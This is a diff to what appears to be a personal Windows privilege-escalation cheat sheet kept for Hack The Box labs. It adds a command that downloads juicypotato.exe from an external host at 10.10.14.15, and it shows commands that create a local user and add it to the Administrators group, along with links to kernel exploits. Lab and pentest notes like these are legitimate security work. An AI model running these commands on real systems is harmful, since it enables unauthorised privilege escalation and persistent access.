@@ -131,7 +131,9 @@ PSRemotingProtocolVersion      2.1
 ```
 Just put paths or connection strings in one array item and split the other things in one array item each.
 
+## File transfert
 
+    invoke-webrequest -uri http://10.10.14.15:81/juicypotato.exe -outfile jp.exe
 
 ## Make invisible visible
 
@@ -261,6 +263,8 @@ Version=14.0.23506
  
 ## Manual escalation commands
 ````
+whoami /all
+
 net user username password /add
 net localgroup Administrators username /add
 net localgroup "Remote Desktop Users" username /add
@@ -586,7 +590,7 @@ https://github.com/SecWiki/windows-kernel-exploits/raw/master/win-exp-suggester/
     https://github.com/SecWiki/windows-kernel-exploits
 
 
-## MS15-051
+## MS15-051 : nice one !
 
 ```
 https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
@@ -609,7 +613,7 @@ root@kali:~/htb/YoloToolbox/machines/htb/granny# python windows-exploit-suggeste
 [*] initiating winsploit version 3.3...
 [+] writing to file 2019-09-08-mssb.xls
 [*] done
-root@kali:~/htb/YoloToolbox/machines/htb/granny# python windows-exploit-suggester.py -i systeminfo.txt -d 2019-09-08-mssb.xls
+# python windows-exploit-suggester.py -i systeminfo.txt -d 2019-09-08-mssb.xls
 [*] initiating winsploit version 3.3...
 ```
 
